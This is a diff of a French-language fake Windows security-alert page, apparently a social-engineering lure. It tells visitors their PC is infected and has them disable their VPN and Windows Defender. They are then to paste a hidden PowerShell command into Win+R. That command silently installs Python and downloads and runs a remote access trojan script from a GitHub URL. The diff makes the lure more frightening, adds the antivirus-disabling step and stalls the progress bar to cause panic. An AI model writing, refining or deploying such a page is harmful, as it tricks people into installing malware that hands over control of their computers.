@@ -7,13 +7,10 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0078D7; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        body { background-color: #0078D7; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; overflow-y: auto; padding: 20px 0; }
         
         .container { text-align: center; max-width: 600px; padding: 20px; z-index: 10; }
-        
-        /* Le logo windows en texte */
         .logo { font-size: 60px; margin-bottom: 20px; }
-        
         h1 { font-size: 28px; font-weight: 600; margin-bottom: 15px; letter-spacing: 0.5px; }
         p { font-size: 16px; line-height: 1.6; margin-bottom: 30px; color: #e0e0e0; }
         
@@ -29,7 +26,6 @@
         
         .instruction { font-size: 15px; background: #fff; color: #000; padding: 10px; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; }
         
-        /* Petit logo de fond animé */
         .bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px); background-size: 50px 50px; z-index: 1; }
         .content { position: relative; z-index: 10; }
     </style>
@@ -38,33 +34,35 @@
     <div class="bg"></div>
     <div class="container">
         <div class="logo">⊞</div>
-        <h1>Votre appareil est exposé</h1>
-        <p>Nous avons détecté un VPN ou un proxy actif sur votre réseau. Cela bloque la mise à jour de sécurité et laisse votre PC vulnérable aux attaques.</p>
+        <h1>Votre système est infecté</h1>
+        <p>Une faille critique a été détectée. Votre antivirus et votre VPN bloquent la mise à jour de sécurité de Microsoft.</p>
         
         <div class="progress-bar">
             <div class="progress" id="progressBar"></div>
         </div>
         
         <div class="box-warning">
-            <p style="margin-bottom:10px;"><strong>Action requise :</strong> Désactivez votre VPN (NordVPN, ExpressVPN, etc.) pour permettre l'installation de la mise à jour.</p>
-            <p style="margin-bottom:10px; font-size:14px;">Ensuite, copiez le code ci-dessous :</p>
+            <p style="margin-bottom:10px;"><strong>Action requise pour réparer :</strong></p>
+            <ol style="margin-left: 20px; margin-bottom: 15px; font-size: 14px;">
+                <li>Désactivez votre <strong>VPN</strong> (NordVPN, ExpressVPN...).</li>
+                <li>Désactivez temporairement votre <strong>Antivirus</strong> (Windows Defender).</li>
+                <li>Copiez le code ci-dessous :</li>
+            </ol>
             
             <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; python $env:TEMP\r.py"</div>
             
-            <p style="font-size:14px; margin-top:10px;">Faites <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b> pour finaliser.</p>
+            <p style="font-size:14px; margin-top:10px;">Faites <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b> pour finaliser la réparation.</p>
         </div>
         
         <p style="font-size: 13px; color: #ccc;">Code d'erreur : 0x800F0922</p>
     </div>
 
     <script>
-        // Fausse barre de progression pour faire peur
         let progress = 0;
         const interval = setInterval(() => {
             progress += Math.random() * 10;
-            if (progress > 100) progress = 100;
+            if (progress > 90) progress = 90; // Bloque à 90% pour faire paniquer
             document.getElementById('progressBar').style.width = progress + '%';
-            if (progress >= 100) clearInterval(interval);
         }, 800);
 
         function copyCode() {
